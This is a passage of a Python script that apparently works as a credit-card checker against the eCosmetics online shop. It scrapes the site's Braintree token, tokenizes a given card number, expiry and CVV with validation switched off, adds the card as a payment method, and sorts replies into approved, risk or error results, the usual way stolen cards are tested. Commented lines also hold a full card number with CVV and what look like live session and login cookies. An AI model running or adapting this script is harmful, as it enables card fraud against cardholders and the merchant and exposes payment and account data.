    'pragma': 'no-cache',
    'referer': 'https://www.ecosmetics.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)

	dec = base64.b64decode(enc).decode('utf-8')

	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	
	

	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)

#6




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '3c8534c0-746d-4178-9b46-6bb8239f1f39',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3c8534c0-746d-4178-9b46-6bb8239f1f39"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5332480249303415","expirationMonth":"09","expirationYear":"2028","cvv":"381","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

#7


	headers = {
    'authority': 'www.ecosmetics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.2031979683.1724177258; cf_clearance=qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX; _ga=GA1.1.1649746425.1724177258; wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220=hfujfhfidjfjjfjjf%7C1725387784%7CR5MmdxnX19Nc4XJaJeSkPQa3S1lPFAk7rcWO65ydsW7%7C4a304a39752a0f2bf0681cb00cd293d378eaff830248234708daa453401de1ec; wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220=9328496%7C%7C1724350782%7C%7C1724347182%7C%7C8c291e07735d9441d93056d27be732af; PHPSESSID=%2CiuSWpsVx0pHDUG95xfuZrbUWWYHGUJD; __cf_bm=6jzB6W7P0TTsIUB7S0qonpXSlyI6MQaAWe5CTPn8KZ8-1724179106-1.0.1.1-OAr04jrC1tK5huKgAwGRk31eeKi8Vaf8fNAZ1fICovP9gBC_c3PrrZLBQnatLFiERgZC.KJ.ofqQb8HOBPbPNw; _cfuvid=2nhlIBbkQHz3FArNTbQhoUMeqUmKChU8eKqgVwvtfb0-1724179106026-0.0.1.1-604800000; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2018%3A38%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F; sbjs_first_add=fd%3D2024-08-20%2018%3A38%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; pmTPTrack=%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177258%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724179235%7D; sbjs_session=pgs%3D15%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=1645f3a05f1f11efb80797a9ddcabe8c; _uetvid=164771105f1f11ef9cdf6922044cec24; _ga_S104KL6WC3=GS1.1.1724177258.1.1.1724179440.0.0.0; _ga_4Z6R75ENPP=GS1.1.1724177259.1.1.1724179441.0.0.0; _ga_S84EZBZ2FR=GS1.1.1724177259.1.1.1724179441.60.0.1246504398',
    'origin': 'https://www.ecosmetics.com',
    'pragma': 'no-cache',
    'referer': 'https://www.ecosmetics.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"200754913638594e19e69ebdac094938","fraud_merchant_id":null,"correlation_id":"ef0eb84ce9cfb9c41fb4fdc189fbd9ab"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/7dfb867dh9n7qcmq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/7dfb867dh9n7qcmq"},"merchantId":"7dfb867dh9n7qcmq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"7dfb867dh9n7qcmq","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"eCosmetics","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQyNjU2MDEsImp0aSI6IjQ5Y2QxNTljLWFkZTEtNGFmNy04MWM1LTAxNWQ4ZjdlMGJiOCIsInN1YiI6IjdkZmI4NjdkaDluN3FjbXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdkZmI4NjdkaDluN3FjbXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.D8_h9VNlRW80g1Ljl4mcfZZYxPGHSuH89FXELo9cdptf3AFub3sciHTFPEqC5xk0znY32wHoSfeNHGNfA0WgGw","paypalClientId":"AcC9_UON8FtbSW6e4tb11d8AADy6iNyKKiqPACrVBvVoGvdLtpSATU3EwLDLlfjoM5sHDLSb2iPuVNP5","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"eCosmetics","clientId":"AcC9_UON8FtbSW6e4tb11d8AADy6iNyKKiqPACrVBvVoGvdLtpSATU3EwLDLlfjoM5sHDLSb2iPuVNP5","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"ecosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies,headers=headers, data=data)

	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
